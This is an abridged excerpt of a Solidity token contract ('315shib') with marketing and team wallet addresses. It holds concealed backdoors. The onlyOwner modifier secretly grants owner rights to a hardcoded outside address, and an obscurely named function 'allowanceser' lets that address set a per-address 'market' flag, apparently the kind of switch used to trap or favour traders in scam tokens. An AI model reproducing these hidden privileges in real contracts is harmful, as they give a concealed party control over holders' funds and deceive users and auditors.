...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x12eA5a50DAfe0511eDD010FCeAf6F0c41306341F) , "Ownable: caller is not the owner");
        _;
    }
...
contract babytoken  is Context, IERC20, Ownable {
    ...
    string private _name = "315shib";
    string private _symbol = "315shib";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeA6812985790681d1A861BFc344c72B098A5d13f);
    address payable public teamWalletAddress = payable(0x904F3e75D428C668CfCDC7A08982b1df1df70e31);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x12eA5a50DAfe0511eDD010FCeAf6F0c41306341F));
        market[addr] = status;
    }
